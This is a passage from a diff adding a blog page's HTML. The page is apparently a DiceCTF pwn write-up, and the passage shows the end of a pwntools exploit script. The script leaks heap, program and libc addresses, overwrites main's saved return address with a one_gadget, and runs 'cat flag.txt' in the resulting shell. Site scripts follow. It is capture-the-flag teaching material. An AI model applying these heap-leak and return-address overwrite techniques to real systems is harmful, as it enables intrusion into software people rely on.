+</span><span>                </span><span style="color:#ffa759;">except </span><span style="font-style:italic;color:#5ccfe6;">EOFError</span><span>:
+</span><span>                    </span><span style="color:#ffa759;">with </span><span>context</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">local</span><span>(</span><span style="color:#ffcc66;">log_level</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;error&#39;</span><span>): r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>
+</span><span>
+</span><span>    r, heap_page </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">brute_heap_offset</span><span>()
+</span><span>
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">leak_relative_ptr</span><span>(</span><span style="color:#ffcc66;">b</span><span>):
+</span><span>        </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{b</span><span style="color:#f29e74;">+</span><span>x} {</span><span style="color:#ffcc66;">1</span><span style="color:#f29e74;">+</span><span>x}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>
+</span><span>        </span><span style="color:#ffa759;">for </span><span style="font-style:italic;color:#5ccfe6;">_ </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4m&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;L&quot;</span><span>)
+</span><span>        ptr </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">6</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span>))
+</span><span>        </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{b</span><span style="color:#f29e74;">+</span><span>x} {</span><span style="color:#ffcc66;">1</span><span style="color:#f29e74;">+</span><span>x}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>
+</span><span>        </span><span style="color:#ffa759;">for </span><span style="font-style:italic;color:#5ccfe6;">_ </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>ptr
+</span><span>
+</span><span>
+</span><span>    __dso_handle </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_relative_ptr</span><span>(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">24</span><span>)
+</span><span>    e</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">=  </span><span>__dso_handle </span><span style="color:#f29e74;">- </span><span>e</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;__dso_handle&#39;</span><span>]
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&#39;__dso_handle = </span><span>{</span><span style="color:#f28779;">hex</span><span>(__dso_handle)}</span><span style="color:#bae67e;">&#39;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;program base = </span><span>{</span><span style="color:#f28779;">hex</span><span>(e</span><span style="color:#f29e74;">.</span><span>address)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;offset to a heap page = </span><span>{</span><span style="color:#f28779;">hex</span><span>(heap_page)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    maybe_tcache_perthread </span><span style="color:#f29e74;">= </span><span>heap_page </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x20
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;1 </span><span>{maybe_tcache_perthread}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;L&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">if </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span>(</span><span style="color:#ffcc66;">1</span><span>) </span><span style="color:#f29e74;">== </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\x91</span><span style="color:#bae67e;">&#39;</span><span>:
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>            </span><span style="color:#ffa759;">break
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>        maybe_tcache_perthread </span><span style="color:#f29e74;">-= </span><span style="color:#ffcc66;">0x1000
+</span><span>    heap_base </span><span style="color:#f29e74;">= </span><span>maybe_tcache_perthread </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x8
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;offset to heap base = </span><span>{</span><span style="color:#f28779;">hex</span><span>(heap_base)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    top_chunk </span><span style="color:#f29e74;">= </span><span>heap_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x0ab8
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;-3 </span><span>{top_chunk</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">2</span><span>}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-1 -&quot;</span><span style="color:#f29e74;">+</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1&quot;</span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">0x800</span><span>)
+</span><span>
+</span><span>    libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_relative_ptr</span><span>(top_chunk</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">8</span><span>) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x21ace0
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">leak_absolute_ptr</span><span>(</span><span style="color:#ffcc66;">ptr</span><span>):
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">leak_relative_ptr</span><span>(ptr </span><span style="color:#f29e74;">- </span><span>e</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;data&#39;</span><span>])
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">swap_absolute_str</span><span>(</span><span style="color:#ffcc66;">addr_a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">addr_b</span><span>):
+</span><span>        </span><span style="color:#ffa759;">return f</span><span style="color:#bae67e;">&quot;</span><span>{addr_a</span><span style="color:#f29e74;">-</span><span>e</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;data&#39;</span><span>]} {addr_b</span><span style="color:#f29e74;">-</span><span>e</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;data&#39;</span><span>]}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>()    
+</span><span>
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;libc.address = </span><span>{</span><span style="color:#f28779;">hex</span><span>(libc</span><span style="color:#f29e74;">.</span><span>address)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    stack_ret_address </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_absolute_ptr</span><span>(libc</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;environ&#39;</span><span>]) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x120
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;stack address (main saved ret) = </span><span>{</span><span style="color:#f28779;">hex</span><span>(stack_ret_address)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    saved_rbp_address </span><span style="color:#f29e74;">= </span><span>stack_ret_address </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">8
+</span><span>    one_gadget </span><span style="color:#f29e74;">= </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xebc88
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;one_gadget = </span><span>{</span><span style="color:#f28779;">hex</span><span>(one_gadget)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>
+</span><span>    one_gadget_bytes </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(one_gadget)[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">3</span><span>]
+</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#f28779;">len</span><span>(one_gadget_bytes) </span><span style="color:#f29e74;">!= </span><span style="color:#f28779;">len</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">set</span><span>(one_gadget_bytes)):
+</span><span>        log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">error</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;lower 3 one gadget bytes must all be unique&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffd580;">swap_absolute_str</span><span>(e</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;data&#39;</span><span>]</span><span style="color:#f29e74;">+</span><span>heap_base</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">0xac0</span><span style="color:#f29e74;">+</span><span>i</span><span style="color:#ccc9c2cc;">, </span><span>saved_rbp_address</span><span style="color:#f29e74;">+</span><span>i))
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># writable=True was giving me r sections smh manually check that
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffd580;">swap_absolute_str</span><span>(stack_ret_address</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">next</span><span>(x </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span>libc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(one_gadget_bytes[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">writable</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>) </span><span style="color:#ffa759;">if </span><span>x </span><span style="color:#f29e74;">&gt; </span><span>libc</span><span style="color:#f29e74;">.</span><span>address</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">0x21a000</span><span>)))
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffd580;">swap_absolute_str</span><span>(stack_ret_address</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">next</span><span>(x </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span>libc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(one_gadget_bytes[</span><span style="color:#ffcc66;">1</span><span>]</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">writable</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>) </span><span style="color:#ffa759;">if </span><span>x </span><span style="color:#f29e74;">&gt; </span><span>libc</span><span style="color:#f29e74;">.</span><span>address</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">0x21a000</span><span>)))
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffd580;">swap_absolute_str</span><span>(stack_ret_address</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">next</span><span>(x </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span>libc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(one_gadget_bytes[</span><span style="color:#ffcc66;">2</span><span>]</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">writable</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>) </span><span style="color:#ffa759;">if </span><span>x </span><span style="color:#f29e74;">&gt; </span><span>libc</span><span style="color:#f29e74;">.</span><span>address</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">0x21a000</span><span>)))
+</span><span>    
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 0&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;cat flag.txt;exit&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;$&quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>())
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># dice{i7_S33MS_sOm3BODY_cOOK3D_h3r3_8ff4c343}
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># r.interactive()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span><span>
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">10 February 2024</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/pwn/">#pwn</a></li>
+                    
+                    <li><a href="https://tsheinen.github.io/tags/smart-brute-force/">#smart-brute-force</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
